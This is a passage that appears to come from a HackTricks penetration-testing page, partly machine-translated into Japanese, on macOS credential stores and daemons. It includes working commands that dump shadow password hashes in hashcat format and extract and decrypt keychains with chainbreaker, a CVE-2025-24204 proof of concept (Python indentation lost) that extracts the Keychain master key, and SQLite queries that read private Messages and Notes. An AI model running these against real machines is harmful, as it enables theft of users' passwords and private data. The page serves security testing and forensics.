# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## パスワード

### シャドウパスワード

シャドウパスワードは、**`/var/db/dslocal/nodes/Default/users/`** にある plist のユーザー設定と一緒に保存されています。\
以下のワンライナーを使うと、**ユーザーに関するすべての情報**（ハッシュ情報を含む）をダンプできます:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **形式**。

代替の1行コマンドとして、`-m 7100`（macOS PBKDF2-SHA512）の **hashcat** 形式で、すべての non-service accounts の creds をダンプするものがあります：
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
ユーザーの `ShadowHashData` を取得する別の方法は `dscl` を使うことです: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

このファイルは、システムが **single-user mode** で実行されている場合にのみ **使用されます**（そのため、あまり頻繁ではありません）。

### Keychain Dump

`security` バイナリを使用して **passwords decrypted を dump** する場合、複数のプロンプトがユーザーにこの操作を許可するよう求めます。
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
現代の macOS では、最も興味深い backing stores は通常 **`~/Library/Keychains/login.keychain-db`** と **`/Library/Keychains/System.keychain`** です。これらは SQLite ベースのファイルですが、plaintext へのアクセスは依然として **`securityd`** によって仲介されます。つまり、元の DB を盗んでも、ユーザーのパスワード、`SystemKey`、またはメモリ上の master key も回収しない限り、主に metadata と encrypted blobs しか得られません。

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.

### Keychaindump Overview

**keychaindump** というツールは macOS keychains から passwords を抽出するために開発されましたが、[discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) で示されているように、Big Sur のような新しい macOS では制限があります。**keychaindump** の使用には、attacker がアクセス権を得て権限を **root** まで昇格させる必要があります。このツールは、利便性のために user login 時に keychain がデフォルトで unlock され、application がユーザーの password を繰り返し要求せずに access できるという事実を悪用します。ただし、user が毎回の使用後に keychain を lock するよう設定している場合、**keychaindump** は効果を失います。

**keychaindump** は、**securityd** と呼ばれる特定の process を対象に動作します。Apple によると、これは authorization と cryptographic operations のための daemon であり、keychain への access に不可欠です。抽出プロセスでは、ユーザーの login password から導出された **Master Key** を特定します。この key は keychain file を読むために必要です。**Master Key** を見つけるために、**keychaindump** は `vmmap` コマンドを使って **securityd** の memory heap をスキャンし、`MALLOC_TINY` としてフラグ付けされた領域内で候補 key を探します。以下のコマンドでこれらの memory locations を調べます:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
潜在的な master keys を特定した後、**keychaindump** は heaps を特定のパターン (`0x0000000000000018`) について検索し、それが master key の候補であることを示します。この key を利用するには、**keychaindump** のソースコードに示されているように、deobfuscation を含む追加の手順が必要です。この領域に注目するアナリストは、keychain を decrypt するための重要なデータが **securityd** プロセスの memory 内に保存されていることに注意すべきです。**keychaindump** を実行するコマンドの例は次のとおりです:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) は、OSX keychain から以下の種類の情報をフォレンジックに適した方法で抽出できます:

- [hashcat](https://hashcat.net/hashcat/) または [John the Ripper](https://www.openwall.com/john/) でクラック可能な、hashed Keychain password
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

keychain の解除パスワード、[volafox](https://github.com/n0fate/volafox) または [volatility](https://github.com/volatilityfoundation/volatility) で取得した master key、あるいは SystemKey のような unlock file があれば、Chainbreaker は plaintext passwords も提供します。

これらのいずれの方法でも Keychain を解除できない場合、Chainbreaker は利用可能なその他のすべての情報を表示します。

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey を使って keychain のキー（パスワード付き）をダンプする**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **キーチェーンの鍵（パスワード付き）をダンプしてハッシュをクラックする**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **メモリダンプで keychain のキー（パスワード付き）をダンプする**

**メモリダンプ** を実行するには、[以下の手順に従ってください](../index.html#dumping-memory-with-osxpmem)
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **ユーザーのパスワードを使って keychain のキー（passwords 付き）をダンプする**

ユーザーのパスワードを知っている場合、それを使って **そのユーザーに属する keychain をダンプして復号**できます。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement による Keychain master key（CVE-2025-24204）

macOS 15.0 (Sequoia) では `/usr/bin/gcore` に **`com.apple.system-task-ports.read`** entitlement が付与されていたため、任意のローカル管理者（または悪意のある署名付きアプリ）は、**SIP/TCC が有効でも任意のプロセスメモリをダンプ**できた。`securityd` をダンプすると **Keychain master key** が平文で漏えいし、ユーザーのパスワードなしで `login.keychain-db` を復号できる。

**脆弱なビルド（15.0–15.2）での簡単な再現:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
抽出した hex キーを Chainbreaker (`--key <hex>`) に渡して、login keychain を復号します。Apple は **macOS 15.3+** でその entitlement を削除したため、これは未修正の Sequoia ビルド、または脆弱なバイナリを保持しているシステムでのみ機能します。

### kcpassword

**kcpassword** ファイルは **user’s login password** を保持するファイルですが、これはシステム所有者が **automatic login** を有効にしている場合に限られます。したがって、user は password を求められることなく自動的にログインされます（これはあまり安全ではありません）。

password はファイル **`/etc/kcpassword`** に、キー **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** で xored された状態で保存されます。user の password がキーより長い場合、キーは再利用されます。\
これにより password はかなり簡単に復元でき、たとえば [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d) のような scripts を使えます。

## Databases の興味深い情報

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

**Sequoia**以前は、Notification Center のストアは通常 **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** にあります。**Sequoia+** では、Apple はそれを TCC で保護されたグループコンテナ **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** に移動しました。

興味深い情報のほとんどは **blob** カラム内に保存されているため、その内容を抽出して人間が読める形式に変換する必要があります（`plutil -p -`、`strings`、または小さな parser）。簡単なトリアージの例：
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Recent privacy issues (NotificationCenter DB)

- macOS **14.7–15.1** では、Apple は banner content を `db2/db` SQLite に適切な redaction なしで保存していました。CVE **CVE-2024-44292/44293/40838/54504** により、ローカルユーザーなら誰でも DB を開くだけで他ユーザーの notification text を読めました（TCC prompt なし）。
- Apple はその後、DB を `group.com.apple.usernoted` に移し、新しい Sequoia build では TCC で保護することで緩和しました。そのため、現在のシステムでは通常、これを読むには正しい user context か TCC bypass が必要です。
- 古い endpoint では、artefacts を保持したいなら、更新や reboot の前に `db`、`db-wal`、`db-shm` ファイルをまとめて copy してください。

### Notes

ユーザーの **notes** は `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` にあります
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
上記の one-liner がノイジーすぎる場合は、`ZICNOTEDATA.ZDATA` を export し、gunzip して protobuf を parse してください。これは通常、SQLite に対して直接 `strings` を実行するよりも信頼性が高いです。

### Background Tasks / Login Items

**Ventura** 以降では、ユーザーが承認した login items といくつかの background tasks は、**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** や versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** などの **BTM** stores で追跡されます。

これらのファイルは、persistence、helper tools、そして一部の MDM-managed background items を素早く特定するのに役立ちます:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
永続化の観点と BTM の内部については、[the auto-start locations page](../../macos-auto-start-locations.md#login-items) と [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management) を確認してください。

## Preferences

macOS のアプリでは preferences は **`$HOME/Library/Preferences`** にあり、iOS では `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` にあります。

macOS では cli ツール **`defaults`** を使って **Preferences file を modify** できます。

**`/usr/sbin/cfprefsd`** は XPC services `com.apple.cfprefsd.daemon` と `com.apple.cfprefsd.agent` を取得し、preferences の modify などの actions を実行するために呼び出せます。

## OpenDirectory permissions.plist

ファイル `/System/Library/OpenDirectory/permissions.plist` には node attributes に適用される permissions が含まれており、SIP によって保護されています。\
このファイルは、UUID（uid ではなく）によって特定の users に permissions を付与し、`ShadowHashData`、`HeimdalSRPKey`、`KerberosKeys` などの特定の sensitive information にアクセスできるようにします:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## システム通知

### Darwin Notifications

通知のメインデーモンは **`/usr/sbin/notifyd`** です。通知を受信するには、クライアントは `com.apple.system.notification_center` Mach port 経由で登録する必要があります（`sudo lsmp -p <pid notifyd>` で確認できます）。このデーモンはファイル `/etc/notify.conf` で設定できます。

通知に使われる名前は一意の reverse DNS 形式で、そこに通知が送られると、それを処理できると示したクライアントが受信します。

notifyd プロセスに SIGUSR2 シグナルを送信し、生成されたファイル `/var/run/notifyd_<pid>.status` を読むことで、現在の状態をダンプ（および全名前の確認）することができます:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**`/usr/sbin/distnoted`** がメインバイナリである **Distributed Notification Center** は、通知を送るための別の方法です。いくつかの XPC サービスを公開しており、クライアントを検証しようとしていくつかのチェックを実行します。

### Apple Push Notifications (APN)

この場合、アプリケーションは **topics** に登録できます。クライアントは **`apsd`** を通じて Apple のサーバーに接続し、token を生成します。\
その後、provider も同様に token を生成し、Apple のサーバーに接続してクライアントへメッセージを送信できます。これらのメッセージはローカルで **`apsd`** によって受信され、待機しているアプリケーションへ通知が中継されます。

preferences は `/Library/Preferences/com.apple.apsd.plist` にあります。

macOS では `/Library/Application\ Support/ApplePushService/aps.db`、iOS では `/var/mobile/Library/ApplePushService` にメッセージの local database があります。これには 3 つの table があります: `incoming_messages`、`outgoing_messages`、`channel`。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
daemon と接続に関する情報は、次の方法でも取得できます:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

これらは、ユーザーに画面上で表示される通知です:

- **`CFUserNotification`**: これらの API は、メッセージ付きのポップアップを画面に表示する方法を提供します。
- **The Bulletin Board**: これは iOS でバナーを表示し、しばらくすると消えて Notification Center に保存されます。
- **`NSUserNotificationCenter`**: これは MacOS における iOS の bulletin board です。古い macOS リリースでは、データベースは通常 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` にあります。Sequoia+ では `~/Library/Group Containers/group.com.apple.usernoted/db2/db` に移動されました。

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
